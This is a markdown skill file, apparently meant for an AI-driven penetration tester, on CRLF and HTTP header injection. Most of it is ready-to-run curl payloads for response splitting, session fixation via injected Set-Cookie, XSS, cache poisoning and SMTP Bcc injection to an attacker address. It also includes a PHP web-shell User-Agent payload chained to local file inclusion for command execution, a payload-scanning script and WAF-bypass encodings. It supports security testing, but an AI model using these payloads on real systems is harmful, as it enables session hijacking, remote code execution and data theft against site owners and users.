---
name: crlf-injection
description: CRLF and HTTP header injection attacks including response splitting, log poisoning, session fixation, and XSS via header injection
---

# CRLF Injection

CRLF injection occurs when an attacker injects carriage return (`\r` / `%0d`) and line feed (`\n` / `%0a`) characters into HTTP headers. This can split HTTP responses, inject arbitrary headers (Set-Cookie for session fixation), inject HTML/JS into the response body, and poison server logs.

## Attack Surface

- URL redirect parameters (Location header derived from user input)
- Any endpoint that reflects user input in HTTP response headers
- Logging systems that write user-controlled data (User-Agent, Referer, query params)
- Applications setting cookies from user input

## Reconnaissance

```bash
# Check if CRLF characters are preserved in redirects
curl -sk "https://TARGET/redirect?url=https://example.com%0d%0aInjected:header" -D - -o /dev/null | head -20

# Test various encodings
curl -sk "https://TARGET/redirect?url=test%0d%0aX-Injected:%20true" -D - -o /dev/null
curl -sk "https://TARGET/redirect?url=test%0D%0AX-Injected:%20true" -D - -o /dev/null
curl -sk "https://TARGET/redirect?url=test\r\nX-Injected: true" -D - -o /dev/null
```

## Key Vulnerabilities

### HTTP Response Splitting

```bash
# Inject a complete second response by splitting with double CRLF
curl -sk "https://TARGET/redirect?url=/%0d%0a%0d%0a<html><script>alert(1)</script></html>" -D - -o /dev/null

# Inject custom headers
curl -sk "https://TARGET/redirect?url=/%0d%0aSet-Cookie:%20evil=true" -D - -o /dev/null

# Full response injection
curl -sk "https://TARGET/redirect?url=/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>" -D - -o /dev/null
```

### Session Fixation via Set-Cookie Injection

```bash
# Inject Set-Cookie header to fix victim's session
curl -sk "https://TARGET/redirect?url=https://TARGET/%0d%0aSet-Cookie:%20session=attacker_session_id" -D - -o /dev/null

# With cookie attributes
curl -sk "https://TARGET/redirect?url=/%0d%0aSet-Cookie:%20session=evil;%20Path=/;%20HttpOnly" -D - -o /dev/null
```

### XSS via CRLF

```bash
# Inject content-type and HTML body
curl -sk "https://TARGET/api?callback=test%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2050%0d%0a%0d%0a<script>alert(1)</script>" -D - 

# Inject into existing HTML via header reflection
curl -sk "https://TARGET/page%0d%0a%0d%0a<img%20src=x%20onerror=alert(1)>" -D -
```

### Log Poisoning

```bash
# Inject fake log entries via User-Agent
curl -sk "https://TARGET/" -H "User-Agent: Normal Browser%0d%0a127.0.0.1 - admin [01/Jan/2025:00:00:00] \"GET /admin HTTP/1.1\" 200 1337"

# Inject via Referer
curl -sk "https://TARGET/" -H "Referer: https://google.com%0d%0aFake-Log-Entry: injected"

# Inject into access logs for LFI exploitation
curl -sk "https://TARGET/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# Then exploit via LFI: /page?file=../../../var/log/apache2/access.log&cmd=id
```

### CRLF Encoding Variants

```python
import requests

target = "https://TARGET/redirect?url="
payloads = [
    # Standard CRLF
    "%0d%0aInjected: true",
    "%0D%0AInjected: true",
    # Double encoding
    "%250d%250aInjected: true",
    # Unicode variants
    "%E5%98%8A%E5%98%8DInjected: true",  # UTF-8 encoded CR/LF
    # Mixed encoding
    "%0d%0AInjected: true",
    "%0D%0aInjected: true",
    # Null byte + CRLF
    "%00%0d%0aInjected: true",
    # Line feed only
    "%0aInjected: true",
    # Carriage return only
    "%0dInjected: true",
    # Unicode line separator
    "\u2028Injected: true",
    "\u2029Injected: true",
]

for payload in payloads:
    try:
        r = requests.get(target + payload, verify=False, timeout=5, allow_redirects=False)
        headers = dict(r.headers)
        if "injected" in str(headers).lower():
            print(f"[VULN] CRLF injection with payload: {payload}")
            print(f"  Headers: {headers}")
    except Exception as e:
        pass
```

## Advanced Techniques

### CRLF + Cache Poisoning

```bash
# Inject headers that poison the cache for subsequent users
curl -sk "https://TARGET/page%0d%0aX-Forwarded-Host:%20evil.com?cb=$(date +%s)" -D - -o /dev/null

# Verify cache serves poisoned response
sleep 2
curl -sk "https://TARGET/page?cb=SAME_CB" -D - -o /dev/null | grep -i "evil.com"
```

### CRLF in Email Headers (SMTP Injection)

```bash
# Inject Bcc via registration/contact form
curl -sk "https://TARGET/contact" -X POST \
  -d "email=user@test.com%0d%0aBcc:attacker@evil.com&subject=Test&body=Hello"

# Inject additional recipients
curl -sk "https://TARGET/contact" -X POST \
  -d "email=user@test.com%0aCc:attacker@evil.com&message=test"
```

## Testing Methodology

1. **Identify injection points** — find parameters reflected in HTTP headers (Location, Set-Cookie, custom headers)
2. **Test basic CRLF** — inject `%0d%0a` followed by a header name, check if it appears as a new header
3. **Test encoding variants** — try double encoding, Unicode, mixed case, LF-only
4. **Attempt response splitting** — inject double CRLF (`%0d%0a%0d%0a`) to start response body
5. **Test session fixation** — inject Set-Cookie header via CRLF
6. **Test XSS via splitting** — inject HTML/JS payload in response body after split
7. **Test log injection** — use CRLF in User-Agent, Referer to poison server logs

## Validation

1. Injected header appears as a separate response header in the HTTP response
2. Set-Cookie header injected — browser stores attacker-controlled cookie
3. Response body contains attacker HTML/JS after CRLF split
4. Server logs contain injected fake entries

## False Positives

- Application URL-encodes output (CRLF chars are escaped in Location header)
- Web framework strips CRLF characters from header values (modern frameworks do this)
- Proxy/WAF normalizes or rejects requests with CRLF in parameters
- Response is not split — CRLF appears as literal text, not as header separator

## Impact

- **High**: XSS via response splitting — inject arbitrary HTML/JS
- **High**: Session fixation via Set-Cookie injection — account takeover
- **Medium**: Cache poisoning via injected headers
- **Medium**: Log poisoning → LFI exploitation chain
- **Low**: Information in header injection without exploitable impact

## Pro Tips

1. CRLF in redirect parameters is the most common vector — test `?url=`, `?redirect=`, `?next=` params
2. Try LF-only injection (`%0a`) — some servers accept bare LF as line separator
3. Double-encoding (`%250d%250a`) bypasses WAFs that only decode once
4. Unicode CRLF equivalents (`%E5%98%8A%E5%98%8D`) bypass many input filters
5. Even if response splitting is blocked, header injection alone enables session fixation
6. Log poisoning via CRLF is often the first step in LFI-to-RCE chains
7. Node.js/Express versions prior to 2018 were widely vulnerable to CRLF in redirect()
8. Test CRLF in path segments too, not just query parameters
